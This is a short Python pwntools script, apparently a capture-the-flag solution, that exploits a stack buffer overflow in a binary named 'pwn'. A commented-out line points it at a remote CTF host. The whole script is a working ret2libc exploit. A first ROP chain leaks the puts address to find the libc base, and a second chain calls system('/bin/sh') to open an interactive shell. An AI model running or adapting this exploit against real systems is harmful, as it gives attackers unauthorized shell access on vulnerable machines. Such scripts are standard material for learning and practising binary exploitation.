from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
libc = ELF('libc.so.6')
p = process('./pwn')
#p = remote('gz.imxbt.cn',20036)
elf = ELF('./pwn')

main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x401176
ret = 0x40101a

p.recv()

payload = b'a'*(0xa+8)
payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.sendline(payload)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr-libc.sym['puts']
print(hex(libc_base))

system = libc_base+libc.sym['system']
binsh = libc_base+next(libc.search(b'/bin/sh'))

payload2 = b'a'*(0xa+8)
payload2+=p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)

p.sendline(payload2)
p.interactive()
